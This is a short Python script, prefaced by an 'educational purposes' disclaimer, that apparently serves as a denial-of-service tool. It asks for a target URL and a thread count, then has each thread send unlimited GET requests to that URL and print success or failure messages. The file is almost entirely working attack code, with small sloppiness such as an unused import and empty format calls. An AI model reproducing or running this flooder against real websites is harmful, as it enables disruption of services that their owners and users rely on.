#--------------------- Disclaimer ---------------------

#This tool is made for the purpose of experimentation and education
# We are not responsible for anyone who uses the tool maliciously

#--------------------- Disclaimer ---------------------
from concurrent.futures import thread
import requests
import threading
url = input("Paste The Url That You Want To Send Requests To It Here:")
count = input("Requests Speed:")
number = int(count)
def main():
    reached = 0
    while True:
      r = requests.get(url)
      reached += 1
      if r.status_code == 404:
        print('Failed 404 ❌'.format(reached))
      if r.status_code != 404:
        print('Successfully Sent The Request 200 ✅'.format(reached))  
threads = []
for i in range(number):
  t = threading.Thread(target=main)
  t.daemon = True
  threads.append(t)

for i in range(number):
  threads[i].start()

for i in range(number):
  threads[i].join()
